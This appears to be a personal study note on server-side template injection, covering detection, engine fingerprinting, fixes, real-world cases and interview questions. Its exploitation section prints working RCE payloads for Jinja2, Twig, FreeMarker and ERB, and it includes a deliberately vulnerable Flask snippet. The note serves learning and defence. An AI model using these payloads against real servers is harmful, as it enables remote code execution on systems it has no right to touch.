---
tags: [vuln, web, a05, ssti, injection]
owasp: A05:2025
difficulty: high
status: learning
---

# Server-Side Template Injection (SSTI)

> User input is rendered **as** a template rather than **into** one. Because template engines evaluate expressions and can reach the host language's runtime internals, SSTI frequently escalates from "reflect some text" to full **Remote Code Execution**. Same injection root cause as [[Injection-SQLi]]/[[XSS-Cross-Site-Scripting]]; the sink is the template engine.

---

## 1. The distinction that defines the bug

```python
# ❌ VULNERABLE — user input becomes the template SOURCE
name = request.args.get('name')
render_template_string("Hello " + name)         # name is parsed as template code

# ✅ SAFE — user input is DATA passed to a fixed template
render_template("hello.html", name=request.args.get('name'))
```
In the safe version, `{{7*7}}` in `name` renders literally as the text `{{7*7}}`. In the vulnerable version it renders as `49` — because the engine *evaluates* it. That evaluation is the whole vulnerability.

Root cause: **concatenating or formatting user input into template source**, or letting users supply templates directly (email/report/theme builders are common culprits).

---

## 2. Detection & engine fingerprinting

Inject a mathematical expression and see if it evaluates:

| Payload | Renders | Likely engine |
|---|---|---|
| `{{7*7}}` | `49` | Jinja2 (Python), Twig (PHP) |
| `{{7*'7'}}` | `7777777` = Jinja2, `49` = Twig | disambiguates the two |
| `${7*7}` | `49` | FreeMarker, Java EL, Thymeleaf (some), JSP |
| `#{7*7}` | `49` | Ruby (slim/others), Thymeleaf |
| `<%= 7*7 %>` | `49` | ERB (Ruby), EJS (Node) |
| `{7*7}` | `49` | some (Tornado, etc.) |
| `*{7*7}` / `~{}` | varies | Thymeleaf syntaxes |

**Polyglot to trigger *something* everywhere:** `${{<%[%'"}}%\` — a broken-in-every-engine string that produces distinctive errors you fingerprint from.

Confirming `{{7*7}}` → `49` proves SSTI; you then need the **exact engine**, because the RCE gadget is engine-specific. Use PortSwigger's SSTI decision tree or **tplmap** to automate.

---

## 3. Exploitation → RCE (walkthroughs)

The idea across engines: **escape the template sandbox by walking the language's object graph to reach OS/command primitives.**

### Jinja2 (Python) — the canonical chain
```jinja
{{ 7*7 }}                                    <!-- confirm -->
{{ ''.__class__ }}                            <!-- reach the type system -->
{{ ''.__class__.__mro__ }}                    <!-- method resolution order → object -->
{{ ''.__class__.__mro__[1].__subclasses__() }} <!-- enumerate all loaded classes -->
<!-- find a class exposing os, e.g. subprocess.Popen or a file/warnings class -->
{{ cycler.__init__.__globals__.os.popen('id').read() }}   <!-- clean modern payload -->
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Twig (PHP)
```twig
{{ 7*7 }}
{{ ['id']|filter('system') }}
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}
```

### FreeMarker (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

### ERB (Ruby)
```erb
<%= `id` %>
<%= system("id") %>
```

Each engine has its own gadget; the **concept is identical** — reach runtime internals from within the template. Sandboxes (Jinja2 `SandboxedEnvironment`, Twig sandbox) exist but have a long history of escapes, so treat them as best-effort.

---

## 4. SSTI vs XSS vs plain reflection (don't confuse them)
- Injection returns `{{7*7}}` literally → not SSTI, maybe [[XSS-Cross-Site-Scripting]].
- Returns `49` → SSTI (server-side evaluation) → likely path to **RCE**.
- **Autoescaping (the XSS defence) does NOT stop SSTI** — escaping happens at *output* time; SSTI executes during *evaluation*, before output. Different phase entirely. A common interview trap.

---

## 5. The fix
- **Never render user input as template source.** Pass it as a **variable/context value** to a static, developer-authored template. This eliminates the class.
- If users genuinely must supply templates (rare — themes, email builders):
  - Use a **logic-less engine** (Mustache, or Jinja2's `SandboxedEnvironment` with a hardened policy) and treat the sandbox as defence-in-depth, not a guarantee.
  - Run rendering in an isolated, least-privilege **sandbox/container** (see [[Container-and-Kubernetes-Security]]) so an escape yields little.
  - Allowlist available variables/filters; block attribute access to dunder/internal members.
- Keep engine and libraries patched (sandbox-escape CVEs are frequent).

---

## 6. Real-world cases
- **Uber (2016)** — SSTI in a Jinja2-templated feature → RCE; a widely-studied disclosed report.
- **Shopify, Sony, and many bounty writeups** — SSTI in email/notification/PDF template features (user-controllable templates are a magnet).
- **Craft CMS / various Twig apps** — SSTI CVEs from user-supplied Twig.
- **Atlassian Confluence (CVE-2022-26134)** — OGNL injection (SSTI-adjacent expression-language injection) → unauthenticated RCE, mass-exploited. Same "expression evaluated on the server" root cause.

---

## 7. Practice + interview questions

### Practice
- **PortSwigger Academy → Server-side template injection** — all labs (detection, engine-specific exploitation, sandbox escapes, unknown-context).
- Build a Flask app with `render_template_string("Hi " + name)`, confirm `{{7*7}}`, then walk the Jinja2 chain to `id`. Then refactor to `render_template(..., name=name)` and confirm the payload renders literally.

### Interview questions
- *SSTI vs XSS?* (SSTI executes server-side in the template engine → often RCE; XSS executes in the victim's browser. Different context, different impact.)
- *How do you detect and confirm SSTI, then exploit it?* (`{{7*7}}` → 49, disambiguate the engine, build the engine-specific gadget chain to command execution.)
- *Does output autoescaping stop SSTI?* (No — escaping is at output; SSTI runs at evaluation, earlier. Autoescaping is an XSS control.)
- *Root-cause fix?* (Don't render user input as template source; pass it as data to a static template.)
- *A feature lets users write email templates — how do you make that safe?* (Logic-less engine or hardened sandbox, allowlisted variables, isolated least-privilege rendering, patched libs — and accept the sandbox is best-effort.)

---

**Related:** [[Injection-SQLi]] · [[XSS-Cross-Site-Scripting]] · [[Insecure-Deserialization]] · [[Container-and-Kubernetes-Security]]
